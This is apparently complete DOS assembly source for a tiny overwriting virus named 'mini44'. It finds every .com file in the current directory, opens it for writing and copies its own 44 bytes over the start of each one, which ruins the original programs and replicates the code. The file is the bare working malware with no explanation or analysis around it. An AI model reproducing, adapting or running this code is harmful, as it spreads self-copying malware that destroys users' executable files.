.model tiny
.code
fname EQU 9eh
org 100h

mini44:
	mov AH, 4Eh ; search first
	mov DX, offset COMP_FILE
	int 21h
SEARCH_LP:
	jc DONE

	mov AX, 3D01h
	mov DX, fname
	int 21h

	xchg AX, BX

	mov AH, 40h
	mov CL, 44
	mov DX, 100h
	int 21h

	mov AH, 3Eh
	int 21h
	mov AH, 4Fh ; search next
	int 21h
	jmp SEARCH_LP
done:
	ret
COMP_FILE DB '*.com', 0
END mini44